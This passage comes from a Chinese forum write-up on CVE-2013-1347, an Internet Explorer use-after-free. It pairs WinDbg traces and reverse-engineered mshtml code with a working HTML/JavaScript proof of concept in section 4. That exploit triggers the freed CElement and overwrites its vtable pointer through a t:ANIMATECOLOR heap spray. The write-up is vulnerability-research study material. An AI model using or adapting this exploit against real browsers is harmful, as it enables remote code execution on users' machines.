
### 3.5.2 没有`offsetParent`

没有了设置`offsetParent`的语句，程序直接到达设置`innerHTML`的部分，此时查看`CGenericElement`的`CTreeNode`：

```
0:005> dd 0bef7fb0 l13
0bef7fb0  0c497fc8 0c2a2fb0 ffff0275 ffffffff
0bef7fc0  00000061 00000000 0bef7fd8 0c2a2fc0
0bef7fd0  0c2a2fc0 0bef7fd8 00000062 00000000
0bef7fe0  0c2a2fd8 0bef7fc0 0bef7fc0 0c2a2fd8
0bef7ff0  00000008 00000000 00000000
```

可以看到`Char Format`和`Fancy Format`的位置是`-1`，而如果有设置`offsetParent`的操作，这时这里应该不是`-1`。除此之外，`CTextBlock`的部分也是空的。这点之前也提到了，设置`offsetParent`会让IE重新对DOM树进行渲染，并构造相关的`CTextBlock`结构。

但是继续往下执行，我发现`CTreeNode`这里的空间直接被释放了？？？在IDA中仔细检查相关代码，在**3.4.5**追踪`Fancy Format`的时候，贴过函数调用流程，`CTreeNode::VoidCachedNodeInfo`查看了`Char Format`的数值，向前回溯，到达`CTreeNode::PrivateExitTree`函数：

```
void __usercall CTreeNode::PrivateExitTree(CTreeNode *this@<ecx>, int a2@<esi>)
{
  CTreeNode *v2; // ecx
  CTreeNode::PrivateMakeDead(this);
  if ( (*(_BYTE *)(a2 + 0x40) & 2) == 0 )
    CTreeNode::Release(v2);
}
```

有一个`if`语句，如果通过，会调用`CTreeNode::Release`函数：

```
mov     ecx, [edx+40h]
mov     eax, ecx
shr     eax, 3
and     ecx, 7
lea     eax, [eax*8-8]
or      eax, ecx
mov     [edx+40h], eax
test    eax, 0FFFFFFF8h
jnz     short loc_720AE593 // 如果不跳转，就会执行HeapFree函数
push    edx             ; lpMem
push    0               ; dwFlags
push    _g_hProcessHeap ; hHeap
call    ds:__imp__HeapFree@12 ; HeapFree(x,x,x)
xor     eax, eax
retn
```

这个`if`语句检查的是`CTreeNode`的倒数第三个`DWORD`，在此例中，即数值为`0x08`的字节。如果你查看一下之前的贴图，发生异常的情况下，这里的数值是`0x18`。

这里做个计算：

```
mov     ecx, [edx+40h]   // ecx <- 1000b
mov     eax, ecx
shr     eax, 3           // eax <- 1
and     ecx, 7           // ecx <- 1000b & 111b = 0
lea     eax, [eax*8-8]   // eax <- 1*8-8 = 0
or      eax, ecx         // eax <- 0
mov     [edx+40h], eax
test    eax, 0FFFFFFF8h  // 0 不跳转
------------------------------------------------
mov     ecx, [edx+40h]   // ecx <- 11000b
mov     eax, ecx
shr     eax, 3           // eax <- 11b
and     ecx, 7           // ecx <- 11000b & 111b = 0
lea     eax, [eax*8-8]   // eax <- 3*8-8 = 16 = 10000b
or      eax, ecx         // eax <- 10000b
mov     [edx+40h], eax
test    eax, 0FFFFFFF8h  // != 0 跳转
```

如上，可以看到两种情况的走向完全不同。

这个字节的数值在之前分析`offsetParent`的时候并没有注意，所以这次要在此调试一下，在这里设置一个读写断点，看看设置`offsetParent`是在什么时候对这个字节进行了修改，这个字节又有什么意义。

```
0:005> ba r4 0cec1ff0
0:005> bl
 0 e 71fe4be7     0001 (0001)  0:**** mshtml!CreateElement+0x41 "ln eax;g"
 1 e 71fe485b     0001 (0001)  0:**** mshtml!CElement::CElement+0x4c ".echo '=celement='; r eax;g"
 2 e 71fc0d02     0001 (0001)  0:**** mshtml!CMarkup::InsertElementInternal+0x23d ".echo '= CTreeNode =';r eax;g"
 3 e 71ed20e1     0001 (0001)  0:**** mshtml!CElement::GetOffsetParentHelper
 4 e 0cec1ff0     r 4 0001 (0001)  0:****
```

继续执行，会先到达`CElement::ComputeFormats`，没有重要操作，继续执行，到达这里：

```
0:005> g
Breakpoint 4 hit
eax=00000008 ebx=0849e6fc ecx=0cec1fb0 edx=00000000 esi=0849d018 edi=0849d018
eip=720ae54b esp=0849cf74 ebp=0849cfc4 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
mshtml!CTreeNode::AddRef+0x3:
720ae54b 8bd0            mov     edx,eax
0:005> kb
ChildEBP RetAddr  Args to Child
0849cf70 71f10fc0 00000000 0849d018 0849e6fc mshtml!CTreeNode::AddRef+0x3
0849cfc4 71f1129a 0aeadfa0 0cec1fb0 0849cffc mshtml!CTextBlock::ComputeSpanBeginQualifier+0x289
0849cfe8 71f8c4f7 0aeadfa0 00000002 0849e6f4 mshtml!CTextBlock::BuildSpanBeginRun+0xa1
0849e704 71f8b667 0aeadfa0 0d188f30 0d140fd8 mshtml!CTextBlock::BuildTextBlock+0xaeb
0849e748 71f68f0a 0d188f30 0d140fd8 0c0e9fc8 mshtml!CLayoutBlock::BuildBlock+0x1ec
0849e7c8 71f68c83 0c0e9fc8 0d188f30 0d140fd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59d
0849e800 71f68f0a 0d188f30 0cf00fd8 0c0e7fc8 mshtml!CLayoutBlock::BuildBlock+0x1c1
0849e880 71f68c83 0c0e7fc8 0d188f30 0cf00fd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59d
0849e8b8 71f68f0a 0d188f30 0cbddfd8 0ced9fc8 mshtml!CLayoutBlock::BuildBlock+0x1c1
0849e938 71f68c83 0ced9fc8 0d188f30 0cbddfd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59d
0849e970 71f69af4 0d188f30 00000000 00000000 mshtml!CLayoutBlock::BuildBlock+0x1c1
0849ea34 71f6a4f5 01188f30 0c16afa8 0849ea5b mshtml!CCssDocumentLayout::GetPage+0x22a
0849eba4 7208cc48 0849ed68 0849ed00 00000000 mshtml!CCssPageLayout::CalcSizeVirtual+0x247
0849ecdc 720bce63 0c16afa8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
0849edd8 71fcaa21 00100000 0849ee30 0cee8fd8 mshtml!CLayout::DoLayout+0x11d
0849edec 72067515 0849ee30 0849ee30 7208c20c mshtml!CCssPageLayout::Notify+0x140
0849edf8 7208c20c 00000000 0cf00fb0 00000000 mshtml!NotifyElement+0x41
0849ee0c 7208c108 0849ee30 0cf00fb0 00000000 mshtml!NotifyTreeNode+0x63
0849ee64 7206730e 0849eef8 0bd7f680 0849eef8 mshtml!NotifyAncestors+0x1b7
0849eebc 7206727c 0c6e0f30 00000000 0bd7f744 mshtml!CMarkup::SendNotification+0x92
0849eee4 7208c06c 0849eef8 0bd7f870 ffffffff mshtml!CMarkup::Notify+0xd6
0849ef2c 720f7e44 0000000f 00000000 00000000 mshtml!CElement::SendNotification+0x4a
0849ef54 72119b0d 0bd5dfd8 00000001 0849f030 mshtml!CElement::EnsureRecalcNotify+0x15f
0849ef94 71ed21fc 00000000 00001200 723d8ba0 mshtml!CElement::GetOffsetParentHelper+0x60
0849efa8 720dde50 0bd5dfd8 0849f030 00000000 mshtml!CElement::get_offsetParent+0x30
```

上面的函数调用流程和**3.4.4**小节中，在`CTreeNode`中的`CTextBlock`指针那里设置断点时得到的函数调用流程十分接近，在IDA中查看，这个操作就在设置`CTextBlock`指针操作的后面几步。

再看一下这个函数的代码：

```
int __thiscall CTreeNode::AddRef(CTreeNode *__hidden this)
?AddRef@CTreeNode@@QAEJXZ proc near
mov     eax, [ecx+40h]
mov     edx, eax
and     edx, 0FFFFFFF8h
and     eax, 7
add     edx, 8
xor     edx, eax
mov     [ecx+40h], edx
xor     eax, eax
retn
```

和上面的`CTreeNode::Release`函数中的计算看起来很相似，如果你仔细观察一下它的计算的话，其实`CTreeNode::Release`函数是在做一个`-8`操作，而`CTreeNode::AddRef`是在做一个`+8`操作。

所以`CTreeNode`的倒数第三个`DWORD`应该是这个`CTreeNode`的引用计数，默认有一个引用，指`CElement`中存储的那个`CTreeNode`指针，之后每增加一次引用，数值增加8，如果计数到达0，就会对这个空间进行释放。

鉴于执行完`f0.offsetParent=null;`之后，`CGenericElement`这个计数值从`0x8`变成了`0x18`，所以应该是增加了两个引用。

我猜测这里引用的增加和`element_array`有关（不一定正确）。因为：

目前程序断在了`CTreeNode::AddRef`，步进执行完这个函数，引用增加一次，数值增加8，此时数值是`0x10`。如果这个时候检查`element_array`中的内容：

```
0:005> dd 0cec1fb0  l13
0cec1fb0  0ce20fc8 0bd1afb0 00020275 00000001
0cec1fc0  00000161 00000003 0bd1afc0 0cb8dfc0
0cec1fd0  0bd1afc0 0cec1fd8 00000052 00000000
0cec1fe0  00000000 0cf00fd8 0cec1fc0 0bd1afd8
0cec1ff0  00000010 0aeadfa0 00000000
0:005> dd 0aeadfa0+58 l1
0aeadff8  0d51afc0
0:005> dd 0d51afc0
0d51afc0  00000805 00000001 0bd1afc0 0bd1afb0
0d51afd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
0d51afe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
0d51aff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
0d51b000  ???????? ???????? ???????? ????????
0d51b010  ???????? ???????? ???????? ????????
0d51b020  ???????? ???????? ???????? ????????
0d51b030  ???????? ???????? ???????? ????????
```

如果继续F5执行，程序还会断在这里，执行完这个函数，再次查看`element_array`：

```
0:005> dd 0d51afc0
0d51afc0  00000805 00000001 0bd1afc0 0bd1afb0
0d51afd0  00000005 00000002 0cec1fc0 00000000
0d51afe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
0d51aff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
0d51b000  ???????? ???????? ???????? ????????
0d51b010  ???????? ???????? ???????? ????????
0d51b020  ???????? ???????? ???????? ????????
0d51b030  ???????? ???????? ???????? ????????
```

所以到这里就可以得出结论了，设置`offsetParent`的操作让IE对DOM树进行了渲染，形成`CTextBlock`，并在`CTreeNode`中添加其地址，增加`CTreeNode`的引用数。而清空`innerHTML`的时候，对于`CTextBlock`的操作存在问题，并没有清除`element_array`中的内容，引用数只减少了一个数值，导致对应的`CTreeNode`的空间没有被释放。

### 3.5.3 没有table元素

删除了`f1.appendChild(document.createElement('table'));`这句代码之后，设置好断点，然后让程序一直执行到达`CElement::put_innerHTML`函数，观察此时和`CGenericElment`有关的数据，会发现`element_array`中的数据变化很明显：

```
// element_array
0:005> dd 0d0f4f70 l24
0d0f4f70  00000805 00000001 0bf4bfc0 0bf4bfb0   f0 begintreepos
0d0f4f80  00000806 00000002 0bf4bfd8 0bf4bfb0   f0 endtreepos
0d0f4f90  00000805 00000003 0cee7fc0 0cee7fb0   f1 begintreepos
0d0f4fa0  00000806 00000004 0cee7fd8 0cee7fb0   f1 endtreepos
0d0f4fb0  00000805 00000005 0d156fc0 0d156fb0   f2 begintreepos
0d0f4fc0  00000805 00000006 07a5ffc0 07a5ffb0   CGenericElement begintreepos
0d0f4fd0  00000802 00000007 07a5ffd8 00000000   CGenericElement endtreepos
0d0f4fe0  00000806 00000008 07a5ffd8 07a5ffb0   CGenericElement endtreepos
0d0f4ff0  00000806 00000009 0d156fd8 0d156fb0   f2 endtreepos
```

原本在存在`table`元素的时候，这里面应该只有四组数据，包含`f2`和`CGenericElement`。

现在还不知道这种变化有什么影响，继续向下执行，会发现直到垃圾回收之前，数据都没有什么太大的变化。垃圾回收之后，也只有`CElement`的空间被释放了，`CTreeNode`的空间仍旧存在，那么问题应该处在脚本执行之后的渲染阶段。

我在`element_array`中，`CGenericElement`所在的位置设置了一个读写断点，然后继续执行：

```
0:005> ba r4 0d0f4fc8
Breakpoint 7 hit
eax=0d0f4f70 ebx=00000000 ecx=00000000 edx=0d156fb0 esi=00000050 edi=0d0f4fc0
eip=71d68be1 esp=0854d8e0 ebp=0854d8f0 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
mshtml!SLayoutRun::Clear+0x11:
71d68be1 7403            je      mshtml!SLayoutRun::Clear+0x16 (71d68be6) [br=0]
0:005> kb
ChildEBP RetAddr  Args to Child
0854d8f0 71d3650b 0bf4bfc0 0d116fa0 0854f0b0 mshtml!SLayoutRun::Clear+0x11
0854eff4 71d2b667 0d116fa0 07d6df30 0b87bfd8 mshtml!CTextBlock::BuildTextBlock+0xd62
0854f038 71d08f0a 07d6df30 0b87bfd8 0d01afc mshtml!CLayoutBlock::BuildBlock+0x1ec
0854f0b8 71d08c83 0d01afc8 07d6df30 0b87bfd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59d
0854f0f0 71d09af4 07d6df30 00000000 0cc69fc8 mshtml!CLayoutBlock::BuildBlock+0x1c1
0854f1b4 71d0a4f5 01d6df30 0c122fa8 0854f1db mshtml!CCssDocumentLayout::GetPage+0x22a
0854f324 71e2cc48 0854f4e8 0854f480 00000000 mshtml!CCssPageLayout::CalcSizeVirtual+0x247
0854f45c 71e5ce63 0c122fa8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
0854f558 71d6aa21 00100000 0854f5b0 0d5d6fd8 mshtml!CLayout::DoLayout+0x11d
0854f56c 71e07515 0854f5b0 0854f5b0 71e2c20c mshtml!CCssPageLayout::Notify+0x140
...
```

所以现在位于`SLayoutRun::Clear`函数，是在做什么清除吗？再看一下`element_array`中的内容：

```
0:005> dd 0d0f4f70 l24
0d0f4f70  00000805 00000001 00000000 ffffffff
0d0f4f80  00000806 00000002 00000000 ffffffff
0d0f4f90  00000805 00000003 00000000 ffffffff
0d0f4fa0  00000806 00000004 00000000 ffffffff
0d0f4fb0  00000805 00000005 00000000 ffffffff
0d0f4fc0  00000805 00000006 07a5ffc0 07a5ffb0
0d0f4fd0  00000802 00000007 07a5ffd8 00000000
0d0f4fe0  00000806 00000008 07a5ffd8 07a5ffb0
0d0f4ff0  00000806 00000009 0d156fd8 0d156fb0
```

前面几项竟然都被清除了！！

暂停一下，做一个整理，这篇文章我一共贴了两张图，如果你回过头去看第一张，会发现各个元素的`CTreeNode`结构中，记录`CTextBlock`的位置，`f0`、`f1`的`CTextBlock`和`f2`、`CGenericElement`的`CTextBlock`值是不一样的，而如果没有`table`元素，就像上面显示的，所有元素都在同一个`element_array`中了。

在调试分析`offsetParent`的时候，我们说IE在设置完`offsetParent`之后会对DOM树进行渲染，并构造相应的`CTextBlock`，这个说法其实不太准确，不是“构造”，而是更新。而在脚本全部执行完之后，在此渲染的时候，IE同样会更新`CTextBlock`。就像上面有一些清除操作。

接下来要仔细看一下在渲染前后，`element_array`的变化情况，还是回到会产生异常的那个poc脚本，因为比较好定位，最后一定会结束在异常状态。

```
// 垃圾回收之前
// f0, f1对应的element_array
0:005> dd 0d158fc0
0d158fc0  00000805 00000001 0d1dcfc0 0d1dcfb0   // f0
0d158fd0  00000806 00000002 0d1dcfd8 0d1dcfb0
0d158fe0  00000805 00000003 0be40fc0 0be40fb0   // f1
0d158ff0  00000806 00000004 0cb8dfc0 0be40fb0   // CTable
0d159000  ???????? ???????? ???????? ????????
// CGenericElement对应的element_array
0:005> dd 0d5dcfc0
0d5dcfc0  00000805 00000001 0bd1afc0 0bd1afb0   // f2
0d5dcfd0  00000805 00000002 0cec1fc0 0cec1fb0   // CGenericElement
0d5dcfe0  00000806 00000003 0cec1fd8 0cec1fb0
0d5dcff0  00000806 00000004 0bd1afd8 0bd1afb0
0d5dd000  ???????? ???????? ???????? ????????
```

可以看到在存在`table`元素的时候，有两个不同的`element_array`，而且保存在不同的`CTextBlock`中。接下来继续执行直到发生异常：

```
// 发生异常之后
// f0, f1对应的element_array
0:005> dd 0d158fc0
0d158fc0  ???????? ???????? ???????? ????????
// CGenericElement对应的element_array
0:005> dd 0d5dcfc0
0d5dcfc0  00000805 00000001 0bd1afc0 0bd1afb0   // f2
0d5dcfd0  00000805 00000002 0cec1fc0 0cec1fb0   // CGenericElement
0d5dcfe0  00000806 00000003 0cec1fd8 0cec1fb0
0d5dcff0  00000806 00000004 0bd1afd8 0bd1afb0
0d5dd000  ???????? ???????? ???????? ????????
```

`f0`, `f1`对应的`element_array`所在的空间已经被释放了，如果检查一下对应的`CTextBlock`结构，会发现其中保存的`element_array`地址已经变了：

```
0:005> dd 0cb7cfa0+58 l1
0cb7cff8  07c72fc0
0:005> dd 07c72fc0
07c72fc0  00000805 00000001 0d1dcfc0 0d1dcfb0   // f0 element
07c72fd0  00000806 00000002 0be78fc0 0d1dcfb0   // hr element
07c72fe0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
07c72ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0
07c73000  ???????? ???????? ???????? ????????
```

可以看到`f0`, `f1`对应的`element_array`内容进行了更新，现在里面只有`f0`和`hr`元素了。而`f1`在另一个`element_array`中：

```
0:005> dd 07c76fc0
07c76fc0  00000805 00000001 0be40fc0 0be40fb0   // f1
07c76fd0  00000806 00000002 0be40fd8 0be40fb0
07c76fe0  00000805 00000003 0bd1afc0 0bd1afb0   // f2
07c76ff0  00000806 00000004 0bd1afd8 0bd1afb0
07c77000  ???????? ???????? ???????? ????????
```

唯一的问题就在于之前`f2`和`CGenericElement`所在的`element_array`的空间并没有被释放，仍旧存在：

```
0:005> dd 0d5dcfc0
0d5dcfc0  00000805 00000001 0bd1afc0 0bd1afb0
0d5dcfd0  00000805 00000002 0cec1fc0 0cec1fb0
0d5dcfe0  00000806 00000003 0cec1fd8 0cec1fb0
0d5dcff0  00000806 00000004 0bd1afd8 0bd1afb0
0d5dd000  ???????? ???????? ???????? ????????
```

所以现在可以得出结论了，`table`元素导致生成了两个`CTextBlock`，存在两个`element_array`，在脚本结束后对DOM树进行渲染时，更新`CTextBlock`的操作存在问题，并没有对第二个`CTextBlock`进行更新。最终导致了对已释放空间的访问。

## 3.6 总结

到此为止，做一个总结：

1. 创建`table`元素

   形成两个`CTextBlock`，脚本执行后渲染更新`CTextBlock`的时候，只更新了第一个，保留了对已释放空间的引用。
2. 设置`offsetParent`为`null`

   更新`CTextBlock`，增加引用数，导致设置`innerHTML`的时候，不会删除`CTreeNode`的空间
3. 清空`innerHTML`

   清空`f1`和`f2`下面的元素，让之后的垃圾回收释放不再使用的空间
4. 创建`hr`元素

   让脚本执行后渲染DOM树时，能够重新遍历更新`CTextBlock`

# 4. 漏洞利用

## 4.1 原理

根据文章一开始的分析，异常发生前执行的代码是：

```
mshtml!CElement::Doc:
72adc400 8b01            mov     eax,dword ptr [ecx]
72adc402 8b5070          mov     edx,dword ptr [eax+70h]
72adc405 ffd2            call    edx
```

现在我们已经知道，`ecx`寄存器中保存的是`CGenericElement`的`CElement`的地址，但是这块空间已经被释放了。所以如果能够想办法，在程序执行到这段代码之前，覆盖这块已经释放的空间，就有机会做到漏洞利用。

空间释放的操作发生在垃圾回收函数的调用中，所以覆盖操作要在垃圾释放之后。《漏洞战争》中介绍了`t:ANIMATECOLOR`元素，因为这个元素可以任意设置大小和内容，十分适合用于此次漏洞利用。

> **t:ANIMATECOLOR：**
> Changes the color of an object over time.

**VALUES Attribute | values Property：**
Sets or retrieves a list of semicolon-separated values of an animation.

由于代码中，获取的是偏移为`0x70`处的虚函数，所以`t:ANIMATECOLOR`要设置`0x70`的长度，最后的四个字节设置为shellcode的地址。

## 4.2 代码

```
<!doctype html>
<HTML XMLNS:t="urn:schemas-microsoft-com:time">
<head>
<meta>
<?IMPORT namespace="t" implementation="#default#time2">
</meta>
<script>
function helloWorld()
{
  animvalues = "";
  for (i=0; i <= 0x70/4; i++) {
    if (i == 0x70/4) {
      //animvalues += unescape("%u5ed5%u77c1");
      animvalues += unescape("%u4141%u4141");
    }
    else {
      animvalues += unescape("%u4242%u4242");
    }
  }
  for(i = 0; i < 13; i++) {
    animvalues += ";red";
  }
  f0 = document.createElement('span');
  document.body.appendChild(f0);
  f1 = document.createElement('span');
  document.body.appendChild(f1);
  f2 = document.createElement('span');
  document.body.appendChild(f2);
  document.body.contentEditable="true";
  f2.appendChild(document.createElement('datalist'));
  f1.appendChild(document.createElement('span'));
  f1.appendChild(document.createElement('table'));
  try {
    f0.offsetParent=null;
  } catch(e) {}
  f2.innerHTML="";
  f0.appendChild(document.createElement('hr'));
  f1.innerHTML="";
  CollectGarbage();
  try {
    a = document.getElementById('myanim');
    a.values = animvalues;
  } catch(e) {}
}
</script>
</head>
<body onload="eval(helloWorld());">
<t:ANIMATECOLOR id="myanim"/>
</body>
</html>
```

## 4.3 一些疑惑

### 4.3.1 `t:ANIMATECOLOR`为什么能够覆盖已释放空间？

`t:ANIMATECOLOR`元素中的`values`保存的是指针，指向每个按照分号分隔后的字符串。因此`values`值中包含的分号个数就控制了程序在分配空间时的大小。而exploit代码中按照原本`CGenericElement`的`CElement`空间大小设置了`values`的大小，这种情况下系统肯定会优先选择大小完全一样的堆块空间分配给它，也就正好命中了已释放空间的地址。

**注：`CGenericElement`的空间大小是`0x38`，即十进制的56。56/4==14。在上面的代码中，依靠循环在`animvalues`后面添加了13个`;red`，所以一共就是14个值，正好对应。**

### 4.3.2 虚表指针是怎么设置的？

一开始我没明白虚表指针是怎么设置的，书中写的是“*用第一个分号前面的字符串覆盖虚表指针*”，也没理解什么意思。

后来发现自己把最终`animvalues`的值看错了，又跟着调试了一遍上面的代码：

断点的设置还是跟之前都一样，开始执行之后就能获得各个元素`CElement`和`CTreeNode`的地址，执行到垃圾回收之后，就在`CGenericElement`的`CElement`地址处设置一个写断点，程序中断后看一下函数调用流程：

```
0:005> kb
ChildEBP RetAddr  Args to Child
0307b9f4 738ab65f 00702b88 00000000 00000038 msvcrt!memset+0x5f
0307ba54 738ae9ad 049b9898 00000008 00000000 mstime!CTIMEAnimationBase::put_values+0x23a
0307baa4 76a03ec3 049b9898 00000008 00000000 mstime!CTIMEColorAnimation::put_values+0x51
0307bacc 76a03d3d 049b9898 00000168 00000004 OLEAUT32!DispCallFunc+0x165
```

所以空间的分配应该是在`mstime!CTIMEAnimationBase::put_values`这个函数中，程序在设置`t:ANIMATECOLOR`的`values`的值的时候还会分配一个新的空间，而不只是复制一个指针值，这解决了我的一个疑问，我一开始认为代码中为`animvalues`赋值的时候就已经做了空间的分配。

回退一下，这次在`mstime!CTIMEAnimationBase::put_values`设置断点，然后逐步调试，这里不再贴出调试过程，直接对应到IDA中的代码，给出注解：

```
HRESULT __stdcall CTIMEAnimationBase::put_values(CTIMEAnimationBase *this, struct tagVARIANT pvargSrc)
{
  ...
  str_70 = (CopyString)(v13);   // 这里在为values中的字符串分配空间，并进行复制
  v4 = str_70;
  str_70_ = str_70;
  if ...
  *(this + 20) = str_70;
  (CAttrBase::ClearString)(v3);
  *(this + 76) = 1;
  v17 = StringToTokens(v4, L";", &v22);   // 识别分号，定位分割后第一个字符串
  v7 = v25;
  *(this + 124) = v25;
  if ...
  if ...
  str_13 = ATL_malloc(v7 >> 30 != 0 ? -1 : 4 * v7);   // 这里在为字符串指针分配空间
  // 因为大小和CGenericElement的CElement空间大小相同，所以返回了相同地址
  *(this + 125) = str_13;
  if ( str_13 )
  {
    memset(str_13, 0, 4 * *(this + 124));   // 先将空间数据清空
    v18 = 0;
    if ...
    while ( 1 )   // 这里循环处理所有分割后的字符串
    {
      v9 = *(4 * v18 + v26);
      v10 = v9[1];
      v21 = *v9;
      *(4 * v18 + *(this + 125)) = ATL_malloc((v10 + 1) >> 31 != 0 ? -1 : 2 * (v10 + 1));   // 为分割后字符串分配空间，并设置对应的字符串指针
      // 第一个字符串指针就会作为虚表指针进行使用
      v11 = (4 * v18 + *(this + 125));
      if ( !*v11 )
        break;
      *(*v11 + 2 * v10) = 0;
      StringCchCopyNW((v10 + 1), &str_70_[v21], v10, v14);   // 将分割后字符串的数据复制到了上面分配的空间
      if ( v15 )
      {
        ATL::CComVariant::operator=(*(4 * v18 + *(this + 125)));
        if ( pvarg.lVal )
        {
          if ( !(*(*(this - 170) + 252))(this - 680, &pvarg) )
            v15 = 0;
          VariantClear(&pvarg);
        }
      }
      if ( ++v18 >= *(this + 124) )
        goto LABEL_28;
    }
  }
  ...
}
```

上面代码中的循环结束之后，原本的已释放空间数据如下：

```
0:005> dda 702b88 ld
00702b88  007335b8 "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"
00702b8c  00788908 "r"
00702b90  00788918 "r"
00702b94  00788928 "r"
00702b98  00788938 "r"
00702b9c  00788948 "r"
00702ba0  00788958 "r"
00702ba4  00788968 "r"
00702ba8  00788978 "r"
00702bac  00788988 "r"
00702bb0  00788998 "r"
00702bb4  007889a8 "r"
00702bb8  007889b8 "J"
```

可以看到已经被分割后字符串指针代替了。`007335b8`会被当成虚表指针。

# 5. 总结

总的来说，这次的漏洞分析让我在IE调试上学习到了很多，也了解到了很多IE底层的知识，而且极大地锻炼了自己的耐心。自认为对于CVE-2013-1347漏洞，文章里分析的已经很透彻了，也发现了一些书中没有提到的细节。

至于UAF漏洞利用，原理也算是清楚了，这次的漏洞和我在上周示例代码遇到的双重释放导致的UAF差别很大，上周的异常是由于多重释放时堆块大小的计算出现问题，导致访问超出范围，现在看来这应该不是普遍会遇到的UAF的情况，但是整个调试经历，异常原因的分析也很有趣。

# 6. 参考资料

1. 《漏洞战争》
2. [MASM Numbers and Operators](https://bbs.kanxue.com/elink@8a0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6V1L8$3y4K6i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8#2M7#2)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3c8Z5j5i4u0V1N6$3q4J5k6g2)9J5c8X3c8J5K9i4k6W2M7Y4y4Q4x3V1k6V1k6h3u0#2k6$3N6W2M7W2)9J5c8X3#2S2M7$3#2Q4x3X3c8F1N6h3#2T1k6i4u0K6i4K6u0V1j5h3&6V1i4K6u0V1L8%4m8W2M7X3q4@1L8%4u0K6i4K6t1K6L8Y4g2E0k6i4u0A6j5#2)9J5k6r3!0H3k6i4u0S2N6r3!0J5M7#2)9J5k6r3W2F1i4K6u0V1L8h3q4K6L8g2)9J5k6r3g2^5M7s2u0W2M7%4y4A6L8$3&6K6)（windbg中的命令使用MASM语法）
3. [windbg条件断点总结](https://bbs.kanxue.com/elink@38fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3j5h3c8&6L8r3g2W2i4K6u0r3M7q4)9J5c8U0V1@1x3U0f1I4x3K6c8Q4x3X3g2Z5N6r3#2D9)
4. [移植自2000泄漏代码中的ie部分代码](https://bbs.kanxue.com/elink@b2cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3y4H3M7r3u0D9L8$3N6Q4x3X3g2U0L8$3#2Q4x3V1k6%4L8s2N6D9P5r3A6Q4x3V1k6S2M7X3y4Z5K9i4k6W2i4K6u0r3x3U0l9I4x3g2)9J5c8U0l9$3i4K6u0r3x3o6q4Q4x3V1j5I4y4o6M7&6x3o6c8Q4x3X3g2Z5N6r3#2D9)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-2-16 17:12 被zzephyr编辑，原因：错误修改

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)
[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)
[#UAF](https://bbs.kanxue.com/forum-150-1-158.htm)
